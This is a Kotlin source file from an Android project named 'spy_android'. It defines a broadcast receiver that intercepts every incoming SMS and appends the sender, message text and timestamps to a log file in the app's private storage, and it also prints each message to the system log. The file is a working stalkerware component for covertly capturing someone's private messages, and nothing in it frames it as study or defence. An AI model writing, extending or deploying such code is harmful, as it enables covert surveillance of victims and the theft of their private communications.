package com.example.spy_android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras

            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<*>?

                if (pdus != null) {
                    for (pdu in pdus) {
                        val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)

                        val senderNumber = smsMessage.displayOriginatingAddress
                        val messageBody = smsMessage.messageBody
                        val timestamp = smsMessage.timestampMillis

                        // SMS 정보를 로그에 저장
                        saveSmsToLog(context, senderNumber, messageBody, timestamp)

                        Log.d("SmsReceiver", "SMS 수신: $senderNumber - $messageBody")
                    }
                }
            }
        }
    }

    private fun saveSmsToLog(context: Context, sender: String, message: String, timestamp: Long) {
        try {
            val smsData = mapOf(
                "sender" to sender,
                "message" to message,
                "timestamp" to SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp)),
                "received_at" to System.currentTimeMillis(),
                "type" to "received_realtime"
            )

            // 내부 저장소에 SMS 로그 저장
            val logDir = File(context.filesDir, "logs")
            if (!logDir.exists()) {
                logDir.mkdirs()
            }

            val logFile = File(logDir, "sms_realtime.log")
            val jsonData = android.text.TextUtils.join(",", smsData.map { "\"${it.key}\":\"${it.value}\"" })
            logFile.appendText("{$jsonData}\n")

        } catch (e: Exception) {
            Log.e("SmsReceiver", "SMS 로그 저장 실패: ${e.message}")
        }
    }
}